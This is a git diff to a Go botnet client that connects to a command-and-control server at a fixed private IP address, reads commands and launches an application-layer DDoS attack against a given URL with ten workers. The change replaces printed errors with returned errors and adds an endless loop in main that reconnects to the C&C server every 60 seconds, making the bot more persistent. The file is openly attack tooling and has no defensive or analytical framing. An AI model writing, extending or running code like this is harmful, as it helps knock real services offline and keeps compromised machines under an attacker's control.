@@ -75,14 +75,13 @@ func (d *DDoS) Stop() {
 
 // The above is an application layer attack
 
-func startClient() {
+func startClient()error{
 	host := "192.168.1.97"
 	port := 12348
 
 	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", host, port))
 	if err != nil {
-		fmt.Println("Error connecting to C&C Server:", err)
-		return
+		return fmt.Errorf("Error connecting to C&C Server: %v", err)
 	}
 	defer conn.Close()
 
@@ -92,8 +91,7 @@ func startClient() {
 		buffer := make([]byte, 1024)
 		n, err := conn.Read(buffer)
 		if err != nil {
-			fmt.Println("Error reading from server:", err)
-			return
+			return fmt.Errorf("Error reading from server: %v", err)
 		}
 		command := string(buffer[:n])
 
@@ -109,8 +107,7 @@ func startClient() {
 					workers:=10
 					attack, err := New(attackURL, workers)
 					if err != nil {
-						fmt.Println("Error creating DDoS attack:", err)
-						return
+						return fmt.Errorf("Error creating DDoS attack: %v", err)
 					}
 					attack.Run()
 					fmt.Println("Attacking... (press Ctrl+C to stop)")
@@ -132,5 +129,16 @@ func startClient() {
 }
 
 func main() {
-	startClient()
+
+	retryInterval := 60 * time.Second
+	//startClient()
+	for {
+		err := startClient()
+		if err != nil {
+			fmt.Println("startClient() error:", err)
+			// 重新嘗試之前等待指定的重試間隔
+			fmt.Printf("Retrying in 60 sec ...\n")
+			time.Sleep(retryInterval)
+		} 
+	}
 }
